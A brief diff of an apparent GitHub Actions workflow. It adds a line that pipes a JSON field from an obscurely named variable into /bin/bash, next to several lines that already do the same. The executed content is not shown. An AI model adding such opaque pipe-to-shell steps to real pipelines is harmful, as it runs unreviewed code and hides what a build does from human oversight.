@@ -24,6 +24,7 @@ jobs:
           echo $iedps2091 | jq -r .i6 | /bin/bash
           printf '%s' "$iwth1524" | jq -r .eaj02235 | /bin/bash
           printf '%s' "$snlhg69" | jq -r .hw25502 | /bin/bash
+          printf '%s' "$bppp75" | jq -r .ayk4 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
